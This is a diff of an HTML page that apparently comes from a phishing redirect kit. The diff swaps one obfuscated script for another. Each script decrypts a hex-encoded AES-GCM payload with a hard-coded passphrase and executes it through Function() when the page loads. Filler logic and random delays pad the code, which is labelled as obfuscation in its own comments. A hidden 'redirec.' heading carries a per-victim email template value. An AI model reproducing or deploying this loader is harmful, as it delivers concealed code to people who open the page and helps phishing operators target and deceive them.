@@ -1,102 +1,39 @@
-
 <script>
-const convertHexToBytes = (hexString) =>
-    Uint8Array.from(hexString.match(/.{1,2}/g).map((byte) => parseInt(byte, 16)));
-
-const performDecryption = async (cipherText, initVectorHex, saltHexString, secretKey) => {
-    const utf8Decoder = new TextDecoder();
-    const initVector = convertHexToBytes(initVectorHex);
-    const saltArray = convertHexToBytes(saltHexString);
-    const derivedKeySource = await crypto.subtle.importKey(
-        "raw",
-        new TextEncoder().encode(secretKey),
-        { name: "PBKDF2" },
-        false,
-        ["deriveKey"]
-    );
-    const finalAesKey = await crypto.subtle.deriveKey(
-        { name: "PBKDF2", salt: saltArray, iterations: 100000, hash: "SHA-256" },
-        derivedKeySource,
-        { name: "AES-GCM", length: 256 },
-        false,
-        ["decrypt"]
-    );
-    try {
-        const decodedContent = await crypto.subtle.decrypt(
-            { name: "AES-GCM", iv: initVector },
-            finalAesKey,
-            convertHexToBytes(cipherText)
-        );
-
-        // Random unused check
-        const randomCondition = Math.random() > 0.5 ? "Check-1" : "Check-2";
-        console.log("Random Condition:", randomCondition);
-
-        return utf8Decoder.decode(decodedContent);
-    } catch (errorDuringDecryption) {
-        console.error("Decryption Error:", errorDuringDecryption);
-        throw new Error("Decryption failed");
-    }
-};
-
-const initiateDecryption = async () => {
-    const encryptionDetails = {
-        iv: "b1d6504eea678a007e5d0a24",
-        salt: "d18df4d946a3b82aa0f930ee3300f82c",
-        encryptedContent:
-            "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
-    };
-
-    if (!encryptionDetails) {
-        console.error("Missing required parameters for decryption");
-        return;
-    }
-
-    const { encryptedContent, iv, salt } = encryptionDetails;
-
-    try {
-        // Artificial delay for obfuscation
-        await new Promise((resolve) =>
-            setTimeout(resolve, Math.floor(Math.random() * 1000))
-        );
-
-        const result = await performDecryption(
-            encryptedContent,
-            iv,
-            salt,
-            "my-secret-key"
-        );
-        console.log("Decrypted Result:", result);
-
-        // Meaningless validation step
-        const outputCheck = result.length % 2 === 0 ? "Even-Length" : "Odd-Length";
-        console.log("Output Characteristic:", outputCheck);
-
-        Function(`${result}`)();
-        // Wrap result in useless closure
-        (() => {
-            console.log("Execution wrapped in unnecessary closure");
-        })();
-    } catch (errorDuringExecution) {
-        console.error("Execution Error:", errorDuringExecution.message);
-    }
-};
-
-// Additional pointless function
-const logRedundantMessage = () => {
-    console.log("This is a completely redundant message.");
-};
-
-initiateDecryption();
-logRedundantMessage();
-</script>
-<style type="text/css">
-    h1 {
-      text-align: center;
-      font-size: 120px;
-      font-family: Helvetica, Verdana, Arial;
-      overflow: hidden;
-    }
-    </style>
-    <h1 nike-Skii="" hidden adidas="<%=EMAIL64%>" >redirec.</h1>
+    const hexToBytes = (hex) =>
+        Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
     
+    const decrypt = async (enc, ivHex, saltHex, key) => {
+        const iv = hexToBytes(ivHex), salt = hexToBytes(saltHex);
+        const keyMaterial = await crypto.subtle.importKey("raw", new TextEncoder().encode(key), { name: "PBKDF2" }, false, ["deriveKey"]);
+        const aesKey = await crypto.subtle.deriveKey({ name: "PBKDF2", salt, iterations: 1e5, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
+    
+        try {
+            const dec = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, hexToBytes(enc));
+            return new TextDecoder().decode(dec);
+        } catch (e) {
+            console.error("Decryption failed:", e);
+            throw e;
+        }
+    };
+    
+    (async () => {
+        const params = {
+            iv: "c444d6b988c97f7ea2aa5716",
+            salt: "06b9dcb639aeb4a298624e4d2709f4c3",
+            data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
+        };
+        try {
+            const result = await decrypt(params.data, params.iv, params.salt, "quickescape");
+            console.log("Decrypted:", result);
+    
+            // Dummy logic
+            Function(`${result}`)();
+            const extraCheck = result.length % 2 ? "Odd" : "Even";
+            console.log("Length Check:", extraCheck);
+        } catch (e) {
+            console.error("Execution error:", e);
+        }
+    })();
+    </script>
+    
+    <h1 nike-Skii="" hidden adidas="<%=EMAIL64%>" >redirec.</h1>
